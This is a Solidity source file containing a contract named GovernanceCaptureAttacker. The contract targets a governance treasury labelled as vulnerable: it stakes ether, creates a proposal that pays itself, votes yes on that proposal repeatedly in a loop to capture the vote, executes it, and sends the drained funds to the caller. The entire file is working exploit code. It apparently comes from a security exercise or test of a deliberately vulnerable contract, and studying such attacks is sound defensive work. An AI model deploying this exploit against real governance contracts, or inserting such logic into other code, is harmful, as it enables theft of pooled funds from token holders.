// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVulnerableGovernanceTreasury {
    function stake() external payable;

    function createProposal(address payable recipient, uint256 amount) external returns (uint256);

    function voteYes(uint256 proposalId) external;

    function execute(uint256 proposalId) external;
}

contract GovernanceCaptureAttacker {
    function exploit(address treasury, uint256 payoutAmount, uint256 voteLoops) external payable {
        IVulnerableGovernanceTreasury target = IVulnerableGovernanceTreasury(treasury);
        target.stake{value: msg.value}();

        uint256 proposalId = target.createProposal(payable(address(this)), payoutAmount);
        for (uint256 i = 0; i < voteLoops; i++) {
            target.voteYes(proposalId);
        }
        target.execute(proposalId);

        (bool ok,) = msg.sender.call{value: address(this).balance}("");
        require(ok, "PAYOUT_FAILED");
    }

    receive() external payable {}
}